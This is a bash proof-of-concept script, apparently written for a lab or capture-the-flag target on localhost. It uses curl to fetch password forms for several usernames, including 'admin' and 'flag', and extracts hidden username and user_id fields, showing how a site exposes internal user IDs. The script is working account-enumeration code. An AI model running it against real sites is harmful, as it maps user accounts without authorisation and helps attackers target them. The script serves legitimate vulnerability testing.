#!/bin/bash

# POC: Hidden Form Field User ID Disclosure
# Demonstrates information disclosure of user_id and username in hidden form fields

TARGET_URL="${1:-http://localhost:8080}"

echo "=== Hidden Form Field User ID Disclosure POC ==="
echo "Target: $TARGET_URL"
echo ""

# Test accounts to enumerate
declare -a USERS=("test" "flag" "admin" "user")

echo "[*] Extracting hidden user_id and username fields from password forms..."
echo ""

for user in "${USERS[@]}"; do
    echo "[+] Testing user: $user"
    
    # Fetch the password form for this user
    response=$(curl -s "$TARGET_URL/password/$user")
    
    # Extract hidden username field
    username_field=$(echo "$response" | grep -oP 'name="username"\s+value="\K[^"]+' 2>/dev/null || echo "NOT FOUND")
    
    # Extract hidden user_id field
    user_id_field=$(echo "$response" | grep -oP 'name="user_id"\s+value="\K[^"]+' 2>/dev/null || echo "NOT FOUND")
    
    # Check if we got valid responses
    if [[ "$username_field" != "NOT FOUND" ]] || [[ "$user_id_field" != "NOT FOUND" ]]; then
        echo "    ✓ Disclosed Hidden Fields:"
        echo "      - username: $username_field"
        echo "      - user_id: $user_id_field"
    else
        # User may not exist, try to detect if page loaded
        if echo "$response" | grep -q "type=\"hidden\""; then
            echo "    ⚠ Hidden fields present but couldn't parse"
        else
            echo "    ✗ User not found or no hidden fields in response"
        fi
    fi
    echo ""
done

echo "[*] Information Disclosed:"
echo "    - Internal user_id values are exposed in HTML"
echo "    - These allow targeting specific users for attacks"
echo "    - Enables enumeration when combined with other vulnerabilities"